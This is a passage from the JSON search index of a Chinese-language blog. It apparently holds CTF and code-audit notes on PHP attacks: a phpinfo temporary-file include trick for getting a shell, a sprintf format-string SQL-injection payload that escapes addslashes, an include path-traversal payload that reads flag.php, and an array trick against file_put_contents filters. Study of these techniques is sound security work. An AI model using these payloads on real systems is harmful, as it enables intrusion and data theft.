phpinfo加包含这个是利用上传文件时的临时文件会在phpinfo中加载(当然加载完会被删除),这里利用脚本快速去包含临时文件可以去getshell","categories":[],"tags":[{"name":"技术辣鸡的PHP","slug":"技术辣鸡的PHP","permalink":"http://yoursite.com/tags/%E6%8A%80%E6%9C%AF%E8%BE%A3%E9%B8%A1%E7%9A%84PHP/"}]},{"title":"格式化字符串漏洞","slug":"格式化字符串漏洞","date":"2019-09-08T09:07:56.000Z","updated":"2019-09-08T09:45:00.000Z","comments":true,"path":"2019/09/08/格式化字符串漏洞/","link":"","permalink":"http://yoursite.com/2019/09/08/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/","excerpt":"格式化字符串漏洞","text":"格式化字符串漏洞 原理利用的sprintf函数，在sprintf函数的使用:sprintf(str,arg1,arg2…),分别用arg去匹配%s等类型，当其%后跟的字符所表示的类型不匹配的时候，会被替换成空白。另外一点是，如果%的数量多于arg个数时，可以用%+数字+(\\)$去指定用第几个参数匹配。而sprintf的匹配原则存在漏洞，原因即为:它对%后面加一个字符所表示的类型不理解时比如%\\，它会被替换成空。 sql注入payload:admin%1$\\&#39;利用此去逃逸出&#39;(addslashes绕过?)","categories":[],"tags":[{"name":"ElseWeb","slug":"ElseWeb","permalink":"http://yoursite.com/tags/ElseWeb/"}]},{"title":"PHPAuditLog","slug":"PHPAuditLog","date":"2019-09-08T08:49:40.000Z","updated":"2019-09-08T09:22:40.000Z","comments":true,"path":"2019/09/08/PHPAuditLog/","link":"","permalink":"http://yoursite.com/2019/09/08/PHPAuditLog/","excerpt":"代码审计Trickinclude不过滤进行任意目录读取payload:include(&#39;index.php/../flag.php&#39;)，这里解释一下:这里在index.php的后面加/会被解释成一个目录(虽然不存在)，然后再进入上层../，最后读取到flag.php。","text":"代码审计Trickinclude不过滤进行任意目录读取payload:include(&#39;index.php/../flag.php&#39;)，这里解释一下:这里在index.php的后面加/会被解释成一个目录(虽然不存在)，然后再进入上层../，最后读取到flag.php。 file_put_contents与数组对于写入函数，一般有正则去判断写入内容是否敏感，而对于这种方法结合file_put_contents函数是正好构成了漏洞，正则我们一般尝试数组去绕过限制，而file_put_contents函数特地声明了可传入一个数组参数，可能完美绕过。 123456789&lt;?php$a=array(&apos;a&apos;,&apos;b&apos;,&apos;c&apos;);file_put_contents(&apos;./a.txt&apos;,$a);system(&apos;cat ./a.txt&apos;);?&gt;","categories":[],"tags":[{"name":"技术辣鸡的PHP","slug":"技术辣鸡的PHP","permalink":"http://yoursite.com/tags/%E6%8A%80%E6%9C%AF%E8%BE%A3%E9%B8%A1%E7%9A%84PHP/"}]}]}